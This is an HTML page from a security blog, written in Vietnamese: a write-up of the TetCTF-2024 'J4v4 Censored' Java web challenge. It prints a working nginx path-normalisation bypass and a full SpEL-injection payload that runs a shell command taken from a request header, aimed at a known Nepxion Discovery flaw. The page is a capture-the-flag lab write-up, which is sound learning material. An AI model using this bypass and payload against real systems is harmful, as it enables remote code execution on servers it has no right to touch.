@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="vi-vn">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> TetCTF-2024 Ctf Writeup - J4v4 Censored web challenge and unintended solution that break nginx rule | devme4f blogs</title>
+  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2024/tetctf-2024_j4v4-censored/'>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="TetCTF-2024 Ctf Writeup - J4v4 Censored web challenge and unintended solution that break nginx rule" />
+<meta property="og:description" content="preface Hi! bài này mình sẽ writeup lại bài J4v4 Censored trong giải TetCTF-2024 mà team mình (KCSC) đã solve được. Đây là 1 bài java mình đánh giá không quá khó nhưng lại là half-black-box nên phải đoán, fuzzing khá nhiều nên khi làm mình khá nản nhưng cũng nhờ có teammates quyết tâm tìm ra được unintended solution nên may mắn (cũng chính là team duy nhất) solved được." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://devme4f.github.io/posts/2024/tetctf-2024_j4v4-censored/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-30T15:05:59+07:00" />
+<meta property="article:modified_time" content="2024-01-30T15:05:59+07:00" />
+
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="TetCTF-2024 Ctf Writeup - J4v4 Censored web challenge and unintended solution that break nginx rule"/>
+<meta name="twitter:description" content="preface Hi! bài này mình sẽ writeup lại bài J4v4 Censored trong giải TetCTF-2024 mà team mình (KCSC) đã solve được. Đây là 1 bài java mình đánh giá không quá khó nhưng lại là half-black-box nên phải đoán, fuzzing khá nhiều nên khi làm mình khá nản nhưng cũng nhờ có teammates quyết tâm tìm ra được unintended solution nên may mắn (cũng chính là team duy nhất) solved được."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Archives</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://devme4f.github.io/posts/2023/svattt-2023_new-waf-deser/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://devme4f.github.io/posts/2024/jasig-cas-past-vulnerabilities/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&text=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&title=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&is_video=false&description=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&title=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&title=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&name=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule&description=preface%20Hi%21%20b%c3%a0i%20n%c3%a0y%20m%c3%acnh%20s%e1%ba%bd%20writeup%20l%e1%ba%a1i%20b%c3%a0i%20J4v4%20Censored%20trong%20gi%e1%ba%a3i%20TetCTF-2024%20m%c3%a0%20team%20m%c3%acnh%20%28KCSC%29%20%c4%91%c3%a3%20solve%20%c4%91%c6%b0%e1%bb%a3c.%20%c4%90%c3%a2y%20l%c3%a0%201%20b%c3%a0i%20java%20m%c3%acnh%20%c4%91%c3%a1nh%20gi%c3%a1%20kh%c3%b4ng%20qu%c3%a1%20kh%c3%b3%20nh%c6%b0ng%20l%e1%ba%a1i%20l%c3%a0%20half-black-box%20n%c3%aan%20ph%e1%ba%a3i%20%c4%91o%c3%a1n%2c%20fuzzing%20kh%c3%a1%20nhi%e1%bb%81u%20n%c3%aan%20khi%20l%c3%a0m%20m%c3%acnh%20kh%c3%a1%20n%e1%ba%a3n%20nh%c6%b0ng%20c%c5%a9ng%20nh%e1%bb%9d%20c%c3%b3%20teammates%20quy%e1%ba%bft%20t%c3%a2m%20t%c3%acm%20ra%20%c4%91%c6%b0%e1%bb%a3c%20unintended%20solution%20n%c3%aan%20may%20m%e1%ba%afn%20%28c%c5%a9ng%20ch%c3%adnh%20l%c3%a0%20team%20duy%20nh%e1%ba%a5t%29%20solved%20%c4%91%c6%b0%e1%bb%a3c." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&t=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">preface</a></li>
+    <li><a href="#exploring">exploring</a></li>
+    <li><a href="#bypass-nginx">bypass nginx</a></li>
+    <li><a href="#bypass-spel-injection-blacklist">bypass SpEL injection blacklist</a></li>
+    <li><a href="#end---ref">end - ref</a>
+      <ul>
+        <li><a href="#nginxconf">nginx.conf</a></li>
+        <li><a href="#result-">result 😍😍</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        TetCTF-2024 Ctf Writeup - J4v4 Censored web challenge and unintended solution that break nginx rule
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2024-01-30 15:05:59 &#43;0700 &#43;07" itemprop="datePublished">2024-01-30</time>
+          
+        </div>
+        
+        
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/ctf" rel="tag">ctf</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/el-inject" rel="tag">el-inject</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p><img src="/images/2024/TetCTF-2024_J4v4-Censored/theme.png" alt="theme"></p>
+<h2 id="preface">preface</h2>
+<p>Hi! bài này mình sẽ writeup lại bài <code>J4v4 Censored</code> trong giải <em>TetCTF-2024</em> mà team mình (KCSC) đã solve được. Đây là 1 bài java mình đánh giá không quá khó nhưng lại là half-black-box nên phải đoán, fuzzing khá nhiều nên khi làm mình khá nản nhưng cũng nhờ có teammates quyết tâm tìm ra được unintended solution nên may mắn (cũng chính là team duy nhất) solved được. Let&rsquo;s start!</p>
+<h2 id="exploring">exploring</h2>
+<p>Đề cho url đến swagger endpoint nhưng khi truy cập thì không load được list các api:
+<img src="/images/2024/TetCTF-2024_J4v4-Censored/swagger.png" alt="swagger">
+Nguyên nhân do <code>/v2/api-docs?group=discovery</code> đã bị chặn:
+<img src="/images/2024/TetCTF-2024_J4v4-Censored/discovery.png" alt="discovery"></p>
+<p>Thử chuyển thành post method thì bypass được luôn 😀😀:
+<img src="/images/2024/TetCTF-2024_J4v4-Censored/bypass_discovery.png" alt="bypass_discovery"></p>
+<p>Từ info của swagger thì biết được app đang chạy <a href="https://github.com/nepxion/Discovery/">/nepxion/Discovery</a> module <a href="https://github.com/Nepxion/Discovery/tree/6.x.x/discovery-plugin-admin-center/discovery-plugin-admin-center-starter-swagger">discovery-plugin-admin-center-starter-swagger</a> nhưng như title <code>discovery-springcloud-example-admin-remake</code> thì có thể đã được modify.</p>
+<p>Thử tìm CVE trên nền tảng này thì mình thấy có 2 lỗ hổng đáng chú ý là SpEL Injection và SSRF tại đây: <a href="https://securitylab.github.com/advisories/GHSL-2022-033_GHSL-2022-034_Discovery/">https://securitylab.github.com/advisories/GHSL-2022-033_GHSL-2022-034_Discovery/</a></p>
+<p>PoC của 2 lỗ hổng này cũng có sẵn rồi, nhưng khi ốp vào thì lại không ăn ngay:
+<img src="/images/2024/TetCTF-2024_J4v4-Censored/test_poc.png" alt="test_poc">
+Sau một hồi fuzz qua thì mình thấy các keyword như <code>strategy</code>, <code>validate-expression</code> đã bị chặn, cùng với một số ký tự như <code>\</code> hay <code>;</code>. Cũng dễ nhận thấy là endpoint này bị chặn bởi nginx chứ không phải java app, tiềm tàng nguy cơ bị bypass 😂.</p>
+<h2 id="bypass-nginx">bypass nginx</h2>
+<p>Ý tưởng chộp đến ngay là dùng bug SSRF để bypass và request đến endpoint <code>/strategy/validate-expression</code> từ localhost. Thử SSRF thì đến <code>/swagger-ui.html</code> thì vẫn ok:
+<img src="/images/2024/TetCTF-2024_J4v4-Censored/test_index.png" alt="test_index"></p>
+<p>Nhưng đến <code>/strategy/validate-expression</code> thì không được, nguyên nhân cũng khá dễ hiểu do nginx đã chặn các keyword mình đã kể ở trên nếu nằm trong URL, mình cũng chưa tìm ra cách workaround nào khác do <a href="https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-plugin-admin-center/discovery-plugin-admin-center-starter/src/main/java/com/nepxion/discovery/plugin/admincenter/endpoint/RouterEndpoint.java#L55">endpoint</a> này lấy params từ path variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/route/{routeServiceId}/{routeProtocol}/{routeHost}/{routePort}/{routeContextPath}&#34;</span>, method <span style="color:#f92672">=</span> RequestMethod.<span style="color:#a6e22e">GET</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ApiOperation</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;获取指定节点可访问其他节点的路由信息列表&#34;</span>, notes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>, response <span style="color:#f92672">=</span> ResponseEntity.<span style="color:#a6e22e">class</span>, httpMethod <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;GET&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ResponseBody</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> ResponseEntity<span style="color:#f92672">&lt;?&gt;</span> route(<span style="color:#a6e22e">@PathVariable</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;routeServiceId&#34;</span>) <span style="color:#a6e22e">@ApiParam</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;目标服务名&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>) String routeServiceId, <span style="color:#a6e22e">@PathVariable</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;routeProtocol&#34;</span>) <span style="color:#a6e22e">@ApiParam</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;目标服务采用的协议。取值： http | https&#34;</span>, defaultValue <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>) String routeProtocol, <span style="color:#a6e22e">@PathVariable</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;routeHost&#34;</span>) <span style="color:#a6e22e">@ApiParam</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;目标服务所在机器的IP地址&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>) String routeHost, <span style="color:#a6e22e">@PathVariable</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;routePort&#34;</span>) <span style="color:#a6e22e">@ApiParam</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;目标服务所在机器的端口号&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>) <span style="color:#66d9ef">int</span> routePort, <span style="color:#a6e22e">@PathVariable</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;routeContextPath&#34;</span>) <span style="color:#a6e22e">@ApiParam</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;目标服务的调用路径前缀&#34;</span>, defaultValue <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>) String routeContextPath) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> doRemoteRoute(routeServiceId, routeProtocol, routeHost, routePort, routeContextPath);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Chall cũng được cấu hình để chặn out-bound do đó không thể bypass bằng cách tự host server để redirect về lại endpoint mong muốn.
+Stuck tầm 1 ngày thì cuối cùng đồng đội mình (<code>@null001</code>) đã tìm ra cách bypass nginx proxy để request được đến <code>/strategy/validate-expression</code> và exploit SpEL inject, cũng chẳng cần đến bug SSRF luôn(nghe là intended):
+<img src="/images/2024/TetCTF-2024_J4v4-Censored/ui_bypass_dc_r.png" alt="ui_bypass_dc_r"></p>
+<p>URL để bypasss như sau:</p>
+<pre tabindex="0"><code>/strategy;%2f%2e%2e%2f/validate-expression;%2f%2e%2e%2f/
+</code></pre><p>Vì không có source nên mình không thể confirm (<a href="#nginxconf">sau khi giải end có source thì đã confirm được</a>) nhưng mình giả định nguyên nhận là do nginx khi nhận request sẽ thực hiện normalize url trước khi thực hiện các directives để check, sau khi check lại proxy_pass original url chưa decode đến java app. Quá trình normalize đơn giản hóa như sau <a href="https://stackoverflow.com/questions/48708361/nginx-request-uri-vs-uri">stackoverflow</a>:
+<img src="/images/2024/TetCTF-2024_J4v4-Censored/stackoverflow.png" alt="stackoverflow"></p>
+<p>Do đó khi thực hiện request trên, nginx sẽ thực hiên url decode và normalize thành <code>$uri='/'</code> đẫn đến các rule check trên <code>$uri='/'</code> bằng 0 😆😆.</p>
+<p>Nhưng cũng chưa ngon ăn ngay do param <code>expression</code> đã được tác giả custom lại và thêm các backlist keyword mà khi thực hiện SpEL inject sẽ không ăn ngay mà mình fuzz được thì đó là <code>'</code>, <code>&quot;</code> và <code>toString</code>. Ngồi bypass tiếp thôi</p>
+<h2 id="bypass-spel-injection-blacklist">bypass SpEL injection blacklist</h2>
+<p>Với các keyword bị blacklist là <code>'</code>, <code>&quot;</code> và <code>toString</code> nhằm chặn tạo chuỗi string thì ai quen thuộc với dạng đề CTF này mình nghĩ cũng sẽ không quá khó khăn để bypass.</p>
+<p>Do đang là dạng spel inject blind (+ không có out-bound) nên mình hình dung payload để exploit nó sẽ tương tự như này, hạn chế sử dụng các chuỗi string cũng như lấy được input và trả về response đều từ header:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>T(org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">RequestContextHolder</span>).<span style="color:#a6e22e">getRequestAttributes</span>().<span style="color:#a6e22e">getResponse</span>().<span style="color:#a6e22e">setHeader</span>(1,(T(java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Scanner</span>).<span style="color:#a6e22e">getConstructor</span>(T(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">InputStream</span>)).<span style="color:#a6e22e">newInstance</span>(<span style="color:#66d9ef">new</span> ProcessBuilder(T(org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">RequestContextHolder</span>).<span style="color:#a6e22e">getRequestAttributes</span>().<span style="color:#a6e22e">getRequest</span>().<span style="color:#a6e22e">getHeader</span>(1)).<span style="color:#a6e22e">start</span>().<span style="color:#a6e22e">getInputStream</span>()).<span style="color:#a6e22e">useDelimiter</span>(<span style="color:#e6db74">&#34;\\A&#34;</span>).<span style="color:#a6e22e">next</span>()))
+</span></span></code></pre></div><p>Để dễ hiểu thì payload có thể được chia nhỏ như sau:</p>
+<ol>
+<li>Lấy spring response object để kiểm soát response của request:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>T(org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">RequestContextHolder</span>).<span style="color:#a6e22e">getRequestAttributes</span>().<span style="color:#a6e22e">getResponse</span>()
+</span></span></code></pre></div><ol start="3">
+<li>Gọi <code>setHeader()</code> để trả về output của command từ response</li>
+<li>Dùng Scanner để lấy hết string output từ inputstream của process:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>T(java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Scanner</span>).<span style="color:#a6e22e">getConstructor</span>(T(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">InputStream</span>)).<span style="color:#a6e22e">newInstance</span>().<span style="color:#a6e22e">useDelimiter</span>(<span style="color:#e6db74">&#34;\\A&#34;</span>).<span style="color:#a6e22e">next</span>()
+</span></span></code></pre></div><ol start="7">
+<li>Gọi <code>ProcessBuilder</code> thực thi command:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#f92672">&lt;</span>input<span style="color:#f92672">&gt;</span>).<span style="color:#a6e22e">start</span>()
+</span></span></code></pre></div><ol start="9">
+<li>Lấy spring request object để lấy được input (command) từ request hiện tại:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>T(org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">RequestContextHolder</span>).<span style="color:#a6e22e">getRequestAttributes</span>().<span style="color:#a6e22e">getRequest</span>()
+</span></span></code></pre></div><ol start="11">
+<li>Và gọi <code>getHeader()</code> để lấy input từ header <code>1</code></li>
+</ol>
+<p>Để build được payload trên thì mình tự dựng lab tại local để test cho dễ thôi, tuy nhiên payload trên vẫn có chỗ bị blacklist đó là <code>&quot;\A&quot;</code>, để bypass có thể dùng cách sau
+<img src="/images/2024/TetCTF-2024_J4v4-Censored/local_build_payload.png" alt="local_build_payload"></p>
+<p>Convert qua dạng ssti:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>(<span style="color:#66d9ef">new</span> String(T(java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Character</span>).<span style="color:#a6e22e">toChars</span>(92))).<span style="color:#a6e22e">concat</span>(<span style="color:#66d9ef">new</span> String(T(java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Character</span>).<span style="color:#a6e22e">toChars</span>(65)))
+</span></span></code></pre></div><p>Full payload:</p>
+<pre tabindex="0"><code>GET /strategy;%2f%2e%2e%2f/validate-expression;%2f%2e%2e%2f/?condition=T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().setHeader(1,(T(java.util.Scanner).getConstructor(T(java.io.InputStream)).newInstance(new+ProcessBuilder(T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getRequest().getHeader(1)).start().getInputStream()).useDelimiter((new+String(T(java.lang.Character).toChars(92))).concat(new+String(T(java.lang.Character).toChars(65)))).next()))&amp;validation=a%3dtest HTTP/2
+Host: java.tienbip.xyz
+1: /readflag
+</code></pre><p>Done 😇:
+<img src="/images/2024/TetCTF-2024_J4v4-Censored/done.png" alt="done"></p>
+<p><strong>flag</strong>:</p>
+<pre tabindex="0"><code>TetCTF{ssrf`bYp4ss-sst!;W1th&lt;3. :)}
+</code></pre><h2 id="end---ref">end - ref</h2>
+<h3 id="nginxconf">nginx.conf</h3>
+<p><strong>source được cung cấp</strong>:
+<a href="https://drive.google.com/file/d/1HZ268tSJK8FuSR-Y7c8XCuv5hOt7tF6R/view?usp=sharing">https://drive.google.com/file/d/1HZ268tSJK8FuSR-Y7c8XCuv5hOt7tF6R/view?usp=sharing</a></p>
+<p><code>nginx.conf</code></p>
+<pre tabindex="0"><code class="language-conf" data-lang="conf">server {
+      listen 80;
+
+      server_name    2024.tet.ctf;
+      access_log /var/log/nginx/tetctf-access.log;
+      error_log /var/log/nginx/tetctf-error.log;
+
+
+
+      location / {
+            proxy_set_header X-Forwarded-Host $host;
+            proxy_set_header X-Forwarded-Server $host;
+            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+            proxy_pass http://nepxion-admin:1101;
+      }
+
+      location /v2/api-docs {
+            if ($request_method = GET) {
+                  rewrite /v2/api-docs /null break;
+            }
+            proxy_pass http://nepxion-admin:1101/v2/api-docs;
+      }
+      
+      location ~ .*strategy.* {
+            # prevent any cve for api endpoint :) 
+            deny all;
+      }
+
+
+      location ~ .*validate-expression.* {
+            # prevent any cve for api endpoint :) 
+            deny all;
+      }
+
+      location ~ .*\/..\; {
+            # it&#39;s bad for Tomcat :)
+            deny all;
+      }
+
+      location ~ .*\/\; {
+            # it&#39;s bad for Tomcat :)
+            deny all;
+      }
+
+      location ~ .*\; {
+            # it&#39;s bad for Tomcat :)
+            deny all;
+      }
+
+}
+</code></pre><ul>
+<li>
+<p>Check location regex block trước prefix block:
+<img src="/images/2024/TetCTF-2024_J4v4-Censored/nginx_process.png" alt="nginx_process"></p>
+</li>
+<li>
+<p>proxy_pass original url thay vì normalized url khi không specify uri <a href="https://serverfault.com/questions/459369/disabling-url-decoding-in-nginx-proxy">this</a>:
+<img src="/images/2024/TetCTF-2024_J4v4-Censored/proxy_pass.png" alt="proxy_pass"></p>
+</li>
+</ul>
+<h3 id="result-">result 😍😍</h3>
+<p><img src="/images/2024/TetCTF-2024_J4v4-Censored/result.png" alt="result"></p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">Archives</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">preface</a></li>
+    <li><a href="#exploring">exploring</a></li>
+    <li><a href="#bypass-nginx">bypass nginx</a></li>
+    <li><a href="#bypass-spel-injection-blacklist">bypass SpEL injection blacklist</a></li>
+    <li><a href="#end---ref">end - ref</a>
+      <ul>
+        <li><a href="#nginxconf">nginx.conf</a></li>
+        <li><a href="#result-">result 😍😍</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
